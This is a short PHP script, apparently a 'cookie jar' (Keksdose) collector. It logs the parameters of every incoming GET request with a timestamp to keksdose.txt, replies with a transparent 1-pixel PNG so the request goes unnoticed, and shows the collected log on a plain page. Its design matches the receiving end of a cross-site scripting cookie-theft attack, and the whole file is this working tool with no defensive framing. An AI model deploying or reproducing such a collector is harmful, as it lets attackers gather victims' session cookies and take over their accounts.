<?php
   $file = 'keksdose.txt';

   if (!empty($_GET)) {
      file_put_contents($file, date('j.m.y G:i') . ' | ' . serialize($_GET) . "\n\n", FILE_APPEND);
      header('Content-Type: image/png');
      // transparentes, 1px großes PNG
      echo base64_decode('iVBORw0KGgoAAAANSUhEUgAAAAEAAAABAQMAAAAl21bKAAAAA1BMVEUAAACnej3aAAAAAXRSTlMAQObYZgAAAApJREFUCNdjYAAAAAIAAeIhvDMAAAAASUVORK5CYII=');
   }

   else {
      $swag = htmlspecialchars(file_get_contents($file));
   ?>

      <!DOCTYPE html>
      <html>
      <head>
         <meta charset="utf-8">
         <title>Keksdose</title>
         <style>
            textarea {
               display: block;
               width: 600px;
               margin: 50px auto;
               padding: 1em;
               border: .5em solid skyblue;
               font: normal normal 16px/1.3 monospace;
               color: #333;
            }
         </style>
      </head>
      <body>

         <textarea name="content" rows="20"><?= $swag ?></textarea>

      </body>
      </html>

   <?php
   }
?>
